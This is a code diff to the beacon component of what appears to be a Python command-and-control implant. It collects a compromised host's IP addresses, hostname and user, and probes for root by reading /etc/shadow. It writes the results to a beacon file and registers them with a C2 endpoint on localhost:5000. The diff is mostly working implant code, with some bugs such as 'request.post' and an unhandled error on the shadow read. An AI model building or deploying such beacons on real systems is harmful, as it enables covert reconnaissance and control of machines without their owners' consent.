@@ -4,24 +4,44 @@ import os
 import sys
 import subprocess
 import re
+from ..server.agent import Agent
 
 class Beacon():
-    def __init__(self):
+    def __init__(self, agent: Agent):
         self.remote_ip = self.get_ip()[0]
         self.remote_hostname = self.get_hostname()
         self.remote_permissions = self.get_permissions()
-        pass
+        self.beacon_write_path = agent.get_beacon_path()
 
+        if not os.path.exists(self.beacon_write_path):
+            os.makedirs(self.beacon_write_path)
+             
+    def write_new_beacon(self):
+        write_path = self.beacon_write_path
+        reflected_output = f"{self.remote_hostname}, {self.remote_ip}, {self.remote_permissions}"
+
+        try:  
+            with open (write_path, "w") as f:
+                    f.write(reflected_output)
+
+        except OSError as e:
+            print(f"Error writing beacon file {f}")
+            return None
+        
+        return reflected_output
 
     def register_beacon(self):
         compromised_ip = self.remote_ip
         compromised_hostname = self.remote_hostname
         compromised_permissions = self.remote_permissions
 
-        r = request.post("http://localhost:5000/c2/register_beacon", json={"remote_ip":{compromised_ip}, "remote_hostname": {compromised_hostname}, "remote_permissions": {compromised_permissions}})  
+        r = request.post("http://localhost:5000/c2/register_beacon",
+                          json={"remote_ip":compromised_ip,
+                                "remote_hostname": compromised_hostname,
+                                "remote_permissions": compromised_permissions})  
+        
         if r.status_code == 200:
-            print(r.json().get('message'))
-
+            print("Beacon registered", r.json().get("message"))
         else:
             print(f"Error: {r.status_code}, {r.text}")
 
@@ -33,29 +53,22 @@ class Beacon():
     
     def get_ip(self):
         ip_addresses = []
-        try:
-            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
-            ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
-            ip_addresses = ip_pattern.findall(result.stdout)
-        except subprocess.CalledProcessError as e:
-            print(f"Error while running 'ip addr': {e}")
-
+        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
+        ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
+        ip_addresses = ip_pattern.findall(result.stdout)
         return ip_addresses
 
     def get_permissions(self):
             root = False
             name_result = subprocess.run(['whoami'], capture_output= True, text=True, check=True)
             name = name_result.stdout.strip()
-
             if "root" in name :
-                root = True
-                
+                root = True 
             else:
                 check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output= True, text=True, check=True)
                 if "Permission denied" in check_for_root.stderr:
                     pass
                 else:
-                    root = True
-                    
+                    root = True          
             return name, root
-    
+  
